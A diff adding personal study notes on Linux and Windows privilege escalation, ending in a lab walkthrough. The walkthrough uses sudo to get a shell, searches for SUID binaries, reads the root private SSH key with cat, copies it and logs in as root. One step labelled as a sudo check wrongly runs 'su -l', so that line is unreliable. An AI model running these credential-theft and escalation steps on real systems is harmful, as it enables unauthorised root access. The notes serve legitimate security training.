@@ -283,4 +283,69 @@ https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite
 Hosts running on outdated operating systems typically will be vulnerable to kernel exploitation, which can be taken advatage of through tools like searchsploit.
 
 **Vulnerable Software**
-Vulnerable software versions can also be leveraged 
+Vulnerable software versions can also be leveraged, public exploits can be found on running software.
+
+**Windows** - Check Program Files
+**Linux** - dpkg -l
+
+**User Privileges** - These can be exploited by SUID, Windows Token Privileges, and sudo.
+
+Good command to check when landing on a box is -
+```bash 
+sudo -l
+```
+This is able to check what the current privs allowed for sudo with the user.
+
+**Scheduled Tasks**
+In linux these are called Cron Jobs, windows they are scheduled tasks. The two ways they are typically abused is by adding a new scheduled task or by tricking the current scheduled tasks to execute a malicous binary. If you have write privs on the follwing directories you can add a Cron Job:
+```
+/etc/crontab
+/etc/cron.d
+/var/spool/cron/crontabs/root
+```
+We can also get credentials via exposed command history logs, these command history logs can be found in **bash_history** in Linux or **PSReadLine** in Windows. Enumeration scripts will often parse these locations in an attempt to extract.
+
+**SSH Keys**
+Having read access to the SSH directory allows us to extract a users private keys. They can be found at:
+```
+/home/user/.ssh/id_rsa 
+/root/.ssh/id_rsa
+```
+Having access to the root ssh key directory, you can take the key copy it to the local machine and use the -i flag to login with it. Commands:
+```bash
+vim id_rsa
+chmod 600 id_rsa
+ssh root@10.10.10.10 -i id_rsa
+```
+**Labs Steps**
+Login to user1 via ssh
+```bash
+ssh user1@83.136.253.144 -p 38815
+```
+Check sudo perms
+```bash
+su -l
+```
+This reveals that user1 can launch a shell for user2 via
+```bash 
+sudo -u user2 /bin/bash
+```
+Next I tried to enumerate suid binaries with 
+```bash
+ find / -perm -4000 -type f 2>/dev/null
+```
+No results so checked if root ssh dir was readable, it was :)
+```bash 
+find / -type f -name "id_rsa" 2>/dev/null
+```
+After that read the key:
+```bash
+cat /root/.ssh/id_rsa
+```
+Copied the key over to local kali host, into root_key than used it to login to the root user via ssh.
+```bash 
+nano root_key
+chmod 600 root_key
+ssh -i root_key root@<IP>
+```
+boom flag.
